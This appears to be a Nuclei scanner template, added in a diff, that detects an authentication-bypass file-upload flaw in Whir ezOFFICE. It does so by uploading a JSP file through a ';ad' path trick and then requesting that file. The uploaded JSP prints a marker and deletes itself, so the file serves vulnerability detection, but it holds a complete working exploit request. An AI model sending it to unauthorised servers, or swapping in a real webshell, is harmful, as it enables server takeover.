@@ -1,0 +1,61 @@
+id: whir-ezoffice-senddocument-import-file-upload
+
+info:
+  name: Whir ezOFFICE senddocument_import.jsp File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Whir ezOFFICE collaborative management platform senddocument_import.jsp
+    has an authentication bypass and allows arbitrary file uploads. Attackers
+    can upload malicious files to obtain server permissions.
+  tags: file-upload
+  reference:
+    - http://www.whir.net/cn/ezofficeqyb/index_52.html
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/modules/govoffice/gov_documentmanager/senddocument_import.jsp;ad?categoryId=null&path=loginpage&mode=add&fileName=null&saveName=null&fileMaxSize=0&fileMaxNum=null&fileType=jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLNvGnzm2o3sImhz
+
+        ------WebKitFormBoundaryvLNvGnzm2o3sImhz
+        Content-Disposition: form-data; name="photo"; filename="1111.jsp"
+        Content-Type: application/octet-stream
+
+        <%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryvLNvGnzm2o3sImhz
+        Content-Disposition: form-data; name="continueUpload"
+
+        0
+        ------WebKitFormBoundaryvLNvGnzm2o3sImhz
+        Content-Disposition: form-data; name="submit"
+
+        导　入
+        ------WebKitFormBoundaryvLNvGnzm2o3sImhz--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "var saveName="
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - "var saveName=\"(.*?)\\.jsp\";"
+
+  - raw:
+      - |
+        GET /defaultroot/upload/loginpage/{{saveName}}.jsp;fds HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
